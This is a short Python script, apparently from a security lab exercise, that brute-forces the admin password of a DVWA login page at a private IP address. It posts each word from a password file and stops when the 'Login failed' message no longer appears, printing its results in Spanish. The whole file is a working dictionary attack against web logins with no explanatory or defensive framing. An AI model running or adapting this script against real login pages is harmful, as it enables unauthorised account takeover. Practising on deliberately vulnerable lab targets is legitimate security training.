import requests

target_url="http://172.16.212.142/dvwa/login.php"
data={"username":"admin","password":"","Login":"Login"}


def guess():
    with open("passwords.txt", "r") as passwords:
        aux=0
        for line in passwords:
            word = line.strip()
            data['password'] = word
            response = requests.post(target_url, data=data)
            if "Login failed" not in response.content:
                aux=1
                print("[+] Password encontrada: " + word)
                exit()
        if aux==0:
            print("[-] Password no encontrada.")


def main():
    guess()


if __name__ == '__main__':
    main()